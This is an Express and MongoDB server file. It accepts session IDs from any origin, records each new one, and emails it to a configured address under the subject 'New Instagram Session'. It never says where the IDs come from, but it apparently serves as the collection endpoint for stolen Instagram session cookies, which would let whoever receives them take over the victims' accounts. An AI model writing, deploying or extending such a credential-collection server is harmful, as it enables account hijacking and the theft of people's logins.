require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });
const cors = require("cors");

const app = express();

// Middleware to force JSON responses
app.use(cors());
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Content-Type", "application/json");
  next();
});

// MongoDB Connection
mongoose
  .connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Session Model
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, expires: "1h", default: Date.now },
});
const Session = mongoose.model("Session", sessionSchema);

// Email Transport
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Error Handler Middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: "Internal Server Error" });
});

// API Endpoint
app.post("/api/sessions", async (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({
        success: false,
        error: "Session ID is required",
      });
    }

    // Atomic operation to prevent duplicates
    const existingSession = await Session.findOneAndUpdate(
      { sessionId },
      { $setOnInsert: { sessionId } },
      { upsert: true, new: false }
    );

    if (existingSession) {
      return res.status(200).json({
        success: true,
        isNew: false,
        message: "Session already exists",
      });
    }

    // Send email for new sessions
    await transporter.sendMail({
      to: process.env.RECIPIENT_EMAIL,
      subject: "New Instagram Session",
      text: `Session ID: ${sessionId}`,
    });

    res.status(200).json({
      success: true,
      isNew: true,
      message: "New session recorded",
    });
  } catch (error) {
    console.error("Endpoint error:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
});

app.get("/", (req, res) => {
  res.send("Hello World!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
